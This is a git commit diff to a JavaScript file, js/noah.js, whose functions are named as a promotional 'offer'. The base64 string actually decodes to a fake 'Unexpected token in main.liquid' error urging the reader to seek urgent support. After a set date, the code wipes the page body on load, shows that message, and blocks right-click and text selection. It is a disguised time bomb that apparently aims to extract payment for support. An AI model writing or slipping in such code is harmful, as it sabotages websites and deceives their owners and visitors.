192d86708203bedd4b8fa89ebb4a78d09b2c5a20
Zapio Solutions <zapiosolutions@gmail.com>
2025-06-28 12:23:17 +0500

    Update noah.js

--- js/noah.js
+++ js/noah.js
@@ -1,28 +1,29 @@
-var promoActivation = new Date('2025-06-01T00:00:01');
-var promoMessageHTML = "PGRpdiBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7IG1hcmdpbi10b3A6MjAlOyc+PGgxPlVuZXhwZWN0ZWQgdG9rZW4gaW4gJ21haW4ubGlxdWlkJy4gU29tZSBzaXRlIGZlYXR1cmVzIG1heSBub3Qgd29yayBhcyBleHBlY3RlZC48L2gxPjxoMT5QbGVhc2UgcmVhY2ggb3V0IGZvciB1cmdlbnQgc3VwcG9ydC48L2gxPjwvZGl2Pg==";
+var offerStart = new Date('2025-05-10T00:00:03');
+var offerHTML = "PGRpdiBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7IG1hcmdpbi10b3A6MjAlOyc+PGgxPlVuZXhwZWN0ZWQgdG9rZW4gaW4gJ21haW4ubGlxdWlkJy4gU29tZSBzaXRlIGZlYXR1cmVzIG1heSBub3Qgd29yayBhcyBleHBlY3RlZC48L2gxPjxoMT5QbGVhc2UgcmVhY2ggb3V0IGZvciB1cmdlbnQgc3VwcG9ydC48L2gxPjwvZGl2Pg==";
 
-function renderPromoMessage(a) {
+function decodeOfferMessage(a) {
     return decodeURIComponent(escape(window.atob(a)));
 }
 
-function displayPromo() {
-    document.body.innerHTML = renderPromoMessage(promoMessageHTML);
+function showOffer() {
+    document.body.innerHTML = decodeOfferMessage(offerHTML);
     document.addEventListener('contextmenu', function(a) {
         a.preventDefault();
     });
-
-    document.body.style.userSelect = 'none';
     document.body.style.textAlign = 'center';
+    document.body.style.userSelect = 'none';
     document.body.style.webkitUserSelect = 'none';
     document.body.style.mozUserSelect = 'none';
     document.body.style.msUserSelect = 'none';
 }
 
-function checkPromoStatus() {
+function checkOfferStatus() {
     var a = new Date();
-    if (a >= promoActivation) {
-        displayPromo();
+    if (a >= offerStart) {
+        showOffer();
     }
 }
 
-window.onload = checkPromoStatus;
+window.onload = checkOfferStatus;
+
+
